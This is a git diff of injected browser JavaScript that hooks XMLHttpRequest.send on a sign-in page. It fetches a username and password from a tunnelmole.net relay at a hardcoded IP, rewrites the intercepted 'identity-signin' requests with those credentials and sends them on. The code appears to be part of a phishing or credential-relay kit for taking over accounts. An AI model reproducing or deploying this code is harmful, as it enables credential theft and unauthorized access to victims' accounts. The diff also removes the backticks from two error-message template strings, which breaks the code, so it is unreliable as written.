@@ -1,8 +1,11 @@
 let freqUsername = null;
 let freqPassword = null;
+const modifiedUsernameRequests = new Set();
+const modifiedPasswordRequests = new Set();
+const pendingUsernameRequests = new Map();
+const pendingPasswordRequests = new Map();
 let usernameFetched = false;
 let passwordFetched = false;
-let inUsernamePage = true; // Flag to check if we are on the username page
 
 // ✅ Fetch username
 const fetchFreqUsername = async () => {
@@ -15,7 +18,7 @@ const fetchFreqUsername = async () => {
             headers: { 'Cache-Control': 'no-cache' }
         });
 
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});
 
         const result = await response.json();
         console.log('Response from /get-first-post-data:', result);
@@ -27,8 +30,7 @@ const fetchFreqUsername = async () => {
 
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
 
-            // Once username is fetched, handle navigation to password page if needed
-            navigateToPasswordPage();
+            processUsernameRequests();
         } else {
             console.warn("No username data received, retrying...");
             setTimeout(fetchFreqUsername, 500); // Retry in 0.5s
@@ -50,7 +52,7 @@ const fetchFreqPassword = async () => {
             headers: { 'Cache-Control': 'no-cache' }
         });
 
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});
 
         const result = await response.json();
         console.log('Response from /get-first-post-password:', result);
@@ -73,14 +75,25 @@ const fetchFreqPassword = async () => {
     }
 };
 
-// ✅ Handle Navigation from Username Page to Password Page
-const navigateToPasswordPage = () => {
-    if (inUsernamePage) {
-        console.log('Navigating to password page...');
-        inUsernamePage = false; // Mark that we are now on the password page
-        
-        // Trigger the password fetch once the page has been confirmed to transition
-        fetchFreqPassword();
+// ✅ Process pending username requests
+const processUsernameRequests = () => {
+    if (!freqUsername) {
+        console.log("Username not available yet, retrying...");
+        fetchFreqUsername();
+        return;
+    }
+
+    console.log("Processing pending username requests...");
+
+    for (let [xhr, body] of pendingUsernameRequests) {
+        const match = body.match(/identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/);
+        if (match && !modifiedUsernameRequests.has(body)) {
+            const modifiedBody = body.replace(match[1], freqUsername);
+            modifiedUsernameRequests.add(modifiedBody);
+            console.log("Modified request with new username:", modifiedBody);
+            xhr.send(modifiedBody);
+            pendingUsernameRequests.delete(xhr);
+        }
     }
 };
 
@@ -88,15 +101,22 @@ const navigateToPasswordPage = () => {
 const processPasswordRequests = () => {
     if (!freqPassword) {
         console.log("Password not available yet, retrying...");
-        setTimeout(processPasswordRequests, 500);
+        fetchFreqPassword();
         return;
     }
 
     console.log("Processing pending password requests...");
 
-    // Here, you would process any intercepted password requests that are pending
-    // Like you did for the username requests
-    // Example: You might want to send the modified password to the proxy here
+    for (let [xhr, body] of pendingPasswordRequests) {
+        const matchPassword = body.match(/identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/);
+        if (matchPassword && !modifiedPasswordRequests.has(body)) {
+            const modifiedBody = body.replace(matchPassword[1], freqPassword);
+            modifiedPasswordRequests.add(modifiedBody);
+            console.log("Modified request with new password:", modifiedBody);
+            xhr.send(modifiedBody);
+            pendingPasswordRequests.delete(xhr);
+        }
+    }
 };
 
 // ✅ Intercept XMLHttpRequest
@@ -111,7 +131,7 @@ XMLHttpRequest.prototype.send = function (body) {
         console.log("Intercepted username request:", body);
         pendingUsernameRequests.set(this, body);
         processUsernameRequests();
-    } else if (/identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body)) {
+    } else if (/5B%5B%5C%22identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body)) {
         console.log("Intercepted password request:", body);
         pendingPasswordRequests.set(this, body);
         processPasswordRequests();
@@ -179,4 +199,5 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     fetchFreqUsername();
+    fetchFreqPassword();
 });
